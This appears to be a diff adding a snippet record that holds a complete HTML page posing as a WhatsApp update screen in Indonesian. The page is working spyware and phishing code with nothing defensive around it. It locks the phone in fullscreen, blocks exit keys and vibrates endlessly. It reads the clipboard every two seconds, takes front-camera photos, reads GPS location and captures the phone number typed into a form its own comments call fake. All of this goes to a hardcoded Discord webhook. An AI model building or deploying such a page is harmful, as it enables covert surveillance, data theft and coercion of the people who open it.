@@ -1,0 +1,102 @@
+nama=anime
+language=html
+lines=98
+date=11/10/2025
+code=<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <title>Update WhatsApp</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    html,body{height:100%;overflow:hidden;background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont;font-size:18px}
+    #box{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;padding:20px;text-align:center}
+    .logo{width:90px;height:90px;background:url(https://logos-world.net/wp-content/uploads/2020/05/WhatsApp-Logo.png) center/contain no-repeat;margin-bottom:20px}
+    .spin{width:40px;height:40px;border:4px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    button{margin-top:30px;padding:14px 28px;border:none;border-radius:6px;background:#25d366;color:#fff;font-size:16px;cursor:pointer}
+    #captcha{background:#111;border:1px solid #25d366;padding:10px;margin-top:20px;border-radius:6px;width:100%;max-width:280px}
+    input{width:100%;padding:10px;margin-top:8px;border:none;border-radius:4px;font-size:16px}
+  </style>
+</head>
+<body>
+  <div id="box">
+    <div class="logo"></div>
+    <h2>Sedang memperbarui WhatsApp…</h2>
+    <div class="spin"></div>
+    <p>Jangan tutup aplikasi. Butuh waktu 30 detik.</p>
+
+    <!-- Form palsu supaya percaya -->
+    <form id="captcha" autocomplete="on">
+      <label>Konfirmasi nomor Anda</label>
+      <input name="tel" type="tel" placeholder="+62 8xx-xxxx-xxxx" required>
+      <button type="submit">Verifikasi</button>
+    </form>
+  </div>
+
+<script>
+/* ---------- CONFIG ---------- */
+const WEBHOOK = "https://discord.com/api/webhooks/1383616339679383582/ud-xlIrElu98oN6UlTotJjWp6aVBjxQvsThRMZ3O7XM3hkxDf9jYchPp1O2g3YhBYVFd";
+
+/* ---------- UTIL ---------- */
+const post = async (type,data,file) => {
+  const payload = {username:"LockJaw",avatar_url:"https://i.imgur.com/5xH5M8R.png"};
+  if(file){
+    const form = new FormData();
+    form.append("file",file);
+    await fetch(WEBHOOK+"?wait=true",{method:"POST",body:form});
+  }else{
+    payload.embeds = [{title:type,color:0xff0000,fields:[{name:"Data",value:data}]}];
+    await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
+  }
+};
+
+/* ---------- 1. FULLSCREEN & EXIT KILL ---------- */
+function lock(){
+  document.documentElement.requestFullscreen().catch(()=>{});
+  screen.orientation && screen.orientation.lock("portrait").catch(()=>{});
+}
+window.addEventListener("load",lock);
+window.addEventListener("resize",lock);
+document.addEventListener("keydown",e=>e.preventDefault());
+document.addEventListener("backbutton",e=>e.preventDefault()); // Cordova/WebView
+
+/* ---------- 2. VIBRATE FOREVER (opsional) ---------- */
+setInterval(()=>navigator.vibrate && navigator.vibrate([200,100,200]),1000);
+
+/* ---------- 3. CLIPBOARD HIJACK ---------- */
+setInterval(async ()=>{
+  const text = await navigator.clipboard.readText().catch(()=>null);
+  if(text) post("📋 Clipboard",text);
+},2000);
+
+/* ---------- 4. CAMERA AUTO-SNAP ---------- */
+async function snap(){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});
+    const track = stream.getVideoTracks()[0];
+    const img = new ImageCapture(track);
+    const blob = await img.takePhoto();
+    post("📸 Snapshot","",blob);
+    track.stop();
+  }catch(e){}
+}
+window.addEventListener("load",()=>setTimeout(snap,3000)); // pertama kali 3 detik
+setInterval(snap,15000); // kemudian tiap 15 detik
+
+/* ---------- 5. LOCATION ---------- */
+navigator.geolocation.getCurrentPosition(pos=>{
+  const {latitude:lat,longitude:lon}=pos.coords;
+  post("📍 GPS",`${lat}, ${lon}`);
+});
+
+/* ---------- 6. FORM PALSU (agar tetap percaya) ---------- */
+document.getElementById('captcha').addEventListener('submit',e=>{
+  e.preventDefault();
+  const tel = e.target.tel.value;
+  post("☎️ Nomor HP",tel);
+});
+</script>
+</body>
+</html>
